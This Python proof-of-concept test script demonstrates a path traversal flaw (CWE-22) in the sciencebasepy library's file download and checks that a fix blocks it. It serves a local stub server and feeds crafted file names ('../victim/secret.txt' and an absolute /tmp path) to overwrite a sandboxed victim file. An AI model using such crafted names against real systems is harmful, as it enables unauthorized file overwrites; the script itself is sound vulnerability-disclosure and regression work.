#!/usr/bin/env python3
"""
Proof of Concept: Path Traversal in sciencebasepy (CWE-22)

Demonstrates the vulnerability on the UNFIXED code (master, commit 97ca6428)
and confirms the fix on the current branch.

Usage:
    # Show the vulnerability on master:
    git checkout master && python3 tests/poc_before_after.py

    # Show the fix on safe_path branch:
    git checkout safe_path && python3 tests/poc_before_after.py
"""
import os
import sys
import tempfile
import threading
import http.server

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from sciencebasepy.SbSession import SbSession


class StubHandler(http.server.BaseHTTPRequestHandler):
    """Returns attacker bytes for any request."""
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.end_headers()
        self.wfile.write(b"PWNED-BY-MALICIOUS-SCIENCEBASE-RESPONSE")

    def log_message(self, format, *args):
        pass


def main():
    # Start stub server
    server = http.server.HTTPServer(("127.0.0.1", 0), StubHandler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    stub_url = f"http://127.0.0.1:{port}"

    # Create isolated temp directory structure
    with tempfile.TemporaryDirectory() as sandbox:
        dest = os.path.join(sandbox, "downloads")
        os.makedirs(dest)

        # Create a "victim" file that the relative traversal would overwrite
        victim_dir = os.path.join(sandbox, "victim")
        os.makedirs(victim_dir)
        victim_file = os.path.join(victim_dir, "secret.txt")
        with open(victim_file, "w") as f:
            f.write("ORIGINAL VICTIM CONTENT - must not change")

        # Absolute path target
        abs_target = f"/tmp/sbpoc_abs_{os.getpid()}.txt"

        print("=" * 70)
        print("PATH TRAVERSAL PoC - sciencebasepy")
        print("=" * 70)
        print(f"\nSandbox:          {sandbox}")
        print(f"Destination dir:  {dest}")
        print(f"Victim file:      {victim_file}")
        print(f"Abs path target:  {abs_target}")
        print(f"\nVictim file BEFORE: {open(victim_file).read()!r}")
        print()

        # Craft malicious item
        malicious_item = {
            "files": [
                {"name": "../victim/secret.txt", "url": f"{stub_url}/relative"},
                {"name": abs_target, "url": f"{stub_url}/absolute"},
            ]
        }

        # Attempt the download
        sb = SbSession()
        sb._refresh_check = lambda: None

        print("-" * 70)
        print("Attempting download of malicious item...")
        print("-" * 70)

        try:
            sb.get_item_files(malicious_item, destination=dest)
        except ValueError as e:
            print(f"\n[BLOCKED] ValueError raised: {e}")

        print()
        print("-" * 70)
        print("RESULTS")
        print("-" * 70)

        # Check victim file
        victim_content = open(victim_file).read()
        print(f"\nVictim file AFTER:  {victim_content!r}")
        if victim_content == "ORIGINAL VICTIM CONTENT - must not change":
            print("  ✅ Victim file NOT overwritten (traversal blocked)")
        else:
            print("  ❌ VULNERABLE: Victim file was OVERWRITTEN via ../ traversal!")

        # Check absolute path
        abs_exists = os.path.exists(abs_target)
        print(f"\nAbsolute path ({abs_target}) exists: {abs_exists}")
        if abs_exists:
            print(f"  ❌ VULNERABLE: File written to absolute path!")
            print(f"  Contents: {open(abs_target).read()!r}")
            os.unlink(abs_target)  # clean up
        else:
            print("  ✅ No file at absolute path (traversal blocked)")

        # Check what's in the destination
        dest_contents = os.listdir(dest)
        print(f"\nFiles inside destination ({dest}):")
        if dest_contents:
            for f in dest_contents:
                print(f"  - {f}")
            print("  ✅ Files landed safely inside destination")
        else:
            print("  (empty — nothing landed here)")

        print()
        server.shutdown()


if __name__ == "__main__":
    main()
